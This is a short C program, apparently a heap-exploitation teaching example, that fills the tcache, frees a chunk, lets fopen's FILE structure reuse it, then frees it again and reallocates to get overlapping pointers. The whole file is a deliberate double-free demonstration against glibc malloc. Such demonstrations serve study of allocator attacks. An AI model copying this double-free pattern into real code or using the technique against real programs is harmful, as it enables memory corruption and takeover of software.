#include "heaplib.h"

int main() {
    puts("");

    // fill tcache
    fill(2, T_CHUNKS);
    empty(2, T_CHUNKS);

    void *target = calloc(1, BIN_SIZE(2));
    
    free(target); // first free

// start diff
    char throw_away[64];
    FILE *p1 = fopen("fastbin_dup_consolidate_file.c", "r");
    fread(throw_away, 1, 64, p1);
// end diff

    free(target); // second free, since target == p1, this is free(p1); which is valid
    void *p2 = malloc(BIN_SIZE(62)); // allocate the same bin as p1, get p1 (which is target)

    printf("%p : %p : %p\n", target, p1, p2);
}